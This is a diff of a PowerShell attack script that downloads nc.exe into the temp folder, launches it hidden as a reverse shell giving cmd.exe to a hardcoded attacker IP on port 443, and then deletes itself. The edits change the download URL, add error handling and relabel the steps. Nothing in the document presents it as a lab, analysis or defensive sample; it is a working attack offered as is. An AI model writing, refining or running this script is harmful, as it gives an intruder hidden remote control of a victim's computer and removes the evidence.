@@ -1,24 +1,27 @@
+
 [Net.ServicePointManager]::SecurityProtocol = 'Tls12'
 
-# Stable nc.exe (x86)
-$ncUrl      = "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe"
+# settting
+$ncUrl      = "https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/nc.exe"
 $ncPath     = "$env:TEMP\nc.exe"
 $attackerIP = "192.168.1.104"
 $port       = "443"
 
-# Downloads
+# Nc Download
 try {
-    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing -TimeoutSec 30
+    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
 } catch {
     exit 1
 }
 
-# Run
+# Reverse Shell 
 if (Test-Path $ncPath) {
-    Start-Process -FilePath $ncPath -ArgumentList "$attackerIP $port -e cmd.exe" -WindowStyle Hidden
+    Start-Process -FilePath $ncPath -ArgumentList "$attackerIP $port -e cmd.exe" -WindowStyle Hidden -NoNewWindow
 }
 
-# Delete
-Start-Sleep -Seconds 2
-Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
-
+# logical
+$scriptPath = $MyInvocation.MyCommand.Path
+if ($scriptPath) {
+    Start-Sleep -Seconds 2
+    Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
+}
